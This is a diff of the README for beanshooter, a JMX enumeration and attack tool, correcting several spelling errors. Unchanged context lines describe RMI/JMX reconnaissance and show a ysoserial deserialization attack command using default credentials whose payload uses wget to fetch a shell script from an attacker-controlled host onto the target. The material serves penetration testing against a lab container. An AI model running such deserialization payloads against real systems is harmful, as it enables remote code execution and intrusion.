@@ -124,7 +124,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
 ```
 
-This output can be missleading, as *nmap* is not able to detect the *rmiregistry* right away. This is because the *rmiregistry* on
+This output can be misleading, as *nmap* is not able to detect the *rmiregistry* right away. This is because the *rmiregistry* on
 this server is configured for *TLS* usage, which breaks most of the common detection and enumeration tools. However, by looking
 at the high port that was successfully flagged as *Java RMI*, once can guess that one of the *SSL* ports has to be the *rmiregistry*.
 Using [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) (one of the few tools that support *SSL* protected
@@ -333,7 +333,7 @@ of protections:
 *Beanshooter* supports all these types of protections and corresponding examples can be found inside the
 ``README.md`` of the [docker-container](./.docker).
 
-Useful tipp: It is also possible to use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection,
+Useful tip: It is also possible to use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection,
 you have to use the *JMXMP* service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMPPORT>`` and you have to make sure that the *jmxremote_optional.jar* is inside your
 classpath.
 
@@ -376,7 +376,7 @@ In these cases it might still be possible to attack the *JMX* endpoint by using 
 project can be integrated to *beanshooter* by specifying the path to the corresponding *ysoserial .jar* file. This can be configured either in the configuration file or by using the
 ``--yso`` command line option. The default location is ``/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar``.
 
-With *ysoserial* setup correctly, one can attempt a deserialization attack agains the target:
+With *ysoserial* setup correctly, one can attempt a deserialization attack against the target:
 
 ```console
 [qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "wget -O /dev/shm/s.pl http://172.18.0.1:8000/shell.pl"
@@ -462,7 +462,7 @@ beanClass=de.qtc.tonkabean.TonkaBean
 objectName=MLetTonkaBean:name=TonkaBean,id=1
 ```
 
-It is possible to overwrite each option by specifying a custom configuration file using the ``--config`` paramater. The custom config file does not need to contain
+It is possible to overwrite each option by specifying a custom configuration file using the ``--config`` parameter. The custom config file does not need to contain
 all options. Options that are not present were simply set to the default value. If you want your custom configuration to apply for each usage of *beanshooter*, you
 can also modify the [config.properties](./src/config.properties) file inside of the [src](./src) folder before compiling the project. 
 
